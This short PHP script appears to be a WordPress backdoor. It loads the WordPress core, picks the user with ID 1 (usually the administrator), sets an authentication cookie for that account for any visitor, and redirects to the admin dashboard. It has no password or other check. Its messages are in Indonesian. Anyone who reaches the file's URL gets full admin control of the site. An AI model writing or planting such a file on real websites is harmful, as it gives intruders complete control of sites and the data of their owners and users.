<?php

require_once('wp-load.php');

$user_id = 1;

// 3. Eksekusi login
if (!is_user_logged_in()) {
    $user = get_user_by('id', $user_id);
    
    if ($user) {
        wp_clear_auth_cookie();
        wp_set_current_user($user_id, $user->user_login);
        wp_set_auth_cookie($user_id, true);
        do_action('wp_login', $user->user_login, $user);
        
        echo "Sukses! Anda login sebagai: " . $user->user_login;
        echo "<script>window.location.href='" . admin_url() . "';</script>";
        exit;
    } else {
        die("User dengan ID $user_id tidak ditemukan.");
    }
} else {
    wp_redirect(admin_url());
    exit;
}
